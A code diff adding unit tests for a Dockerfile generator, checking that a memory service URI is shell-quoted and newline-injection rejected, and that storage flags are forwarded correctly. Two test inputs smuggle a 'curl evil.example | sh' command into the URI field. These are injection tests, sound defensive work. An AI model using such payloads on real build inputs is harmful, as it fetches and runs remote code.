@@ -168,6 +168,53 @@ describe('createDockerFileContent', () => {
     );
   });
 
+  it('should shell-quote and reject a newline in memoryServiceUri', () => {
+    expect(
+      createDockerFileContent({
+        ...defaultOptions,
+        memoryServiceUri: 'agentengine://123; curl evil.example | sh #',
+      }),
+    ).toContain(
+      "--memory_service_uri='agentengine://123; curl evil.example | sh #'",
+    );
+    expect(() =>
+      createDockerFileContent({
+        ...defaultOptions,
+        memoryServiceUri: 'memory://\nRUN sh -c "curl evil.example|sh"\n#',
+      }),
+    ).toThrow(/Invalid memoryServiceUri/);
+  });
+
+  it.each([
+    [true, '--use_local_storage'],
+    [false, '--no_use_local_storage'],
+  ])('should forward useLocalStorage %s', (useLocalStorage, flag) => {
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      useLocalStorage,
+    });
+
+    expect(content).toContain(flag);
+  });
+
+  it('should omit the storage flag when a service URI is forwarded', () => {
+    // The deployed server rejects the two together, so forwarding both would
+    // stop the container from starting.
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      useLocalStorage: false,
+      sessionServiceUri: 'memory://',
+    });
+
+    expect(content).not.toContain('use_local_storage');
+  });
+
+  it('should omit the storage flag when useLocalStorage is unset', () => {
+    expect(createDockerFileContent(defaultOptions)).not.toContain(
+      'use_local_storage',
+    );
+  });
+
   it('should reject an appName that would break out of the generated Dockerfile', () => {
     // A newline lets an attacker-controlled agent directory name terminate
     // the COPY instruction it's embedded in and start a new Dockerfile
